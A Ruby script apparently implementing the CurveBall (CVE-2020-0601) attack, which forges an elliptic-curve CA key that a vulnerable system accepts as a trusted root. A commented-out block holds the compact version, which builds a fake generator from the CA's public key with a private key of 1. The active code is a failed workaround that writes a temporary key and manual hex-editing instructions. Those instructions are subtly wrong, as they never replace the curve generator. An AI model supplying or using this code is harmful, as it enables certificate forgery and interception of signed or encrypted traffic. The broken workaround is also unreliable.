=begin
// OG
require 'openssl'

raw = File.read ARGV[0]
ca = OpenSSL::X509::Certificate.new(raw) # Read certificate
ca_key = ca.public_key # Parse public key from CA

ca_key.private_key = 1 # Set a private key, which will match Q = d'G'
group = ca_key.group 
group.set_generator(ca_key.public_key, group.order, group.cofactor)
group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE
ca_key.group = group # Set new group with fake generator G' = Q

File.open("spoofed_ca.key", 'w') { |f| f.write ca_key.to_pem }
=end
require 'openssl'

raw = File.read ARGV[0]
ca = OpenSSL::X509::Certificate.new(raw)
ca_key = ca.public_key

# Get curve parameters
curve_name = ca_key.group.curve_name
public_point = ca_key.public_key

# Instead of modifying a key, let's create one from raw parameters
# This avoids the null byte issues with ASN.1 manipulation

begin
  # Create the mathematical components needed for CurveBall
  group = ca_key.group
  order = group.order
  
  # For CurveBall: we want d=1, so Q = 1*G = G
  # But we're setting G to be the original public key
  # So our "public key" becomes the original CA public key
  
  # Create a simple key with d=1 by using OpenSSL's generate method
  # and then replacing what we need to
  
  # Generate a key normally first
  temp_key = OpenSSL::PKey::EC.generate(curve_name)
  
  puts "Generated temporary key for curve: #{curve_name}"
  puts "Original CA public key: #{public_point.to_octet_string(:uncompressed).unpack1('H*')}"
  
  # The trick: save the key and modify it as text/hex
  pem_data = temp_key.to_pem
  der_data = temp_key.to_der
  
  # Convert DER to hex for inspection
  hex_string = der_data.unpack1('H*')
  
  puts "Key structure (first 200 chars): #{hex_string[0,200]}"
  
  # Calculate the target private key (should be 1)
  key_size = (order.num_bits + 7) / 8
  target_private_key = '01'.rjust(key_size * 2, '0')
  
  puts "Target private key (hex): #{target_private_key}"
  
  # For now, save the template and provide instructions
  File.open("spoofed_ca.key", 'w') { |f| f.write pem_data }
  
  # Save the hex representation for manual editing
  File.open("spoofed_ca.hex", 'w') { |f| f.write hex_string }
  
  # Save the target values
  File.open("targets.txt", 'w') do |f|
    f.puts "Curve: #{curve_name}"
    f.puts "Key size: #{key_size} bytes"
    f.puts "Target private key (hex): #{target_private_key}"
    f.puts "Target public key (hex): #{public_point.to_octet_string(:uncompressed).unpack1('H*')}"
    f.puts ""
    f.puts "Instructions:"
    f.puts "1. Edit spoofed_ca.hex with a hex editor"
    f.puts "2. Find the private key field and replace with: #{target_private_key}"
    f.puts "3. Find the public key field and replace with the CA's public key"
    f.puts "4. Convert back to DER and then to PEM"
    f.puts ""
    f.puts "Or use this Ruby snippet:"
    f.puts "modified_der = [modified_hex_string].pack('H*')"
    f.puts "key = OpenSSL::PKey::EC.new(modified_der)"
    f.puts "File.write('final_spoofed.key', key.to_pem)"
  end
  
  puts "\nFiles created:"
  puts "- spoofed_ca.key (template key in PEM format)"
  puts "- spoofed_ca.hex (template key in hex format)"
  puts "- targets.txt (modification instructions)"
  puts ""
  puts "The null byte error occurs during ASN.1 parsing."
  puts "Use the hex approach or a hex editor to complete the modification."
  
rescue => e
  puts "Error: #{e.message}"
  puts ""
  puts "Ruby OpenSSL 3.0 compatibility issue detected."
  puts "Recommendation: Use a different CurveBall implementation or downgrade OpenSSL."
end
